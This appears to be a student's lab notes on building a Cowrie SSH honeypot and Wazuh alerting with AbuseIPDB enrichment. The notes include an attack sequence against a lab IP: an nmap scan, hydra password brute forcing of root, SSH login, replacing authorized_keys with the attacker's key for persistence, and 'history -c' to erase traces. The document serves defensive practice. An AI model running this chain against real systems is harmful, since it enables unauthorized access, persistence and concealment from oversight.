Create honeypot
configure the honeypot via define the login user in userdb.txt 
root:x:rootpasswrd
configure the presented versions via cowrie.cfg
user control+w to quickly find terms in the file, change the SSH version ect.

Use Kali to scan down host/enumerate. 
```bash
nmap -sV -sC  192.168.29.133   
```

User hydra to get the username password to break into SSH
```bash 
hydra -l root  -P  /home/kali/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt  ssh://192.168.29.133:2222
```
SSH into the host with the found password
```bash
ssh root@192.168.29.133 -p 2222  
```
Remove SSH keys and only allow our own while logged into remote host
```bash
rm -rf .ssh
mkdir ~/.ssh
touch ~/.ssh/authorized_keys
cd ./.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCi2sGL3y7CI8VUJP57PMHOhRfkChy725Jnlg/FP/TlxEHIypywakF9HLkL95rB3aKtHrIkq/nlJuswqPqQGJLYky58jag7Pc9uoeSfgRup15vYWMZfSF08ghAjIGXyleRyjGivt+z8/zVDteHUfOYh3SyaRz7Ul8ZKJSGlZ7/ux3yvVttLCCPE9yN8Dv0lFidnO5HuvFNfyqFDRhM9IzUC59+WIfscoX7zCwPVz749j7w4ZdfB/L/kBngZEAc9pqJK48ppbxsQTMImKtxVOLX/loZboPlO8va6oSsJJsnl5TgXkEqIaEXOm3kx7ZlohA246v/CgqTA+1rGpRt7F+Yr3u1CiczOuvRAelZM5s9UkPoXHZgU8R9HGTOiWePrmrv2yvDMbdi2Py8LfN6mehnQqAmmxo3OFky5YDQowdv0eY36Hko5Tm1bRzOLUqfZ62u/dO/yS/Z6RFpxsMuINGApjA0nRLxq+9TuwCVPMW/G8oD7mlaoI5xH+BDKG+N6IJM=">>./authorized_keys
history -c
exit
```
In honey pot find most recent connection and go replay the attack 
```bash 
cd /home/cowrie/cowrie/var/lib/cowrie/tty
ls -l
ls -ltR --time-style=+"%Y-%m-%d %T" ./ | grep -v '^d' | sort -k6,7 | cut -d' ' -f6-
cd /home/cowrie/cowrie/var/lib/cowrie/tty
python3 /home/cowrie/cowrie/bin/playlog ./c823f67fc615fba20a757442184b23c5eb23cd1159e4a36c007554ddc95c16e8
```
Create enrichment with abuseipdb for Wazuh agent.
Made account
copy api key
added integration for abuseip to wazuh integrations
made logs on the linux ssh sever for a test ip out of the abuse ip list 
saw them trigger with api lookup
added logic for confidence score above 70% see workbook for more 
Restart Wazuh
```bash
systemctl status wazuh-manager
```
Check Wazuh status
```bash
systemctl status wazuh-dashboard
systemctl status wazuh-indexer
```
list integrations
```bash
ls -l /var/ossec/integrations
```
view alerts 
```bash
ls /var/ossec/logs/alerts/
```
look at rule files
```bash
ls /var/ossec/ruleset/rules/ | grep vsftpd
```
Install and launch ssh server on linux host
```bash 
sudo su
sudo apt-get update
apt install openssh-server
systemctl start ssh
```
Enabled abuseipdb integration in wazuh
```bash
chmod 755 /var/ossec/integrations/custom-abuseipdb.py
chown root:wazuh /var/ossec/integrations/custom-abuseipdb.py
```
Add integration and api key into wazuh conf
```bash
nano /var/ossec/etc/ossec.conf
<!-- Abuse IPDB Integration -->
<integration>
<name>custom-abuseipdb.py</name>
<hook_url>https://api.abuseipdb.com/api/v2/check</hook_url>
<api_key>YOUR_ABUSEIPDB_API_KEY</api_key>
<level>10</level>
<rule_id>100002</rule_id>
<alert_format>json</alert_format>
</integration>
```
review integration activity
```bash
tail -f /var/ossec/logs/integrations.log
```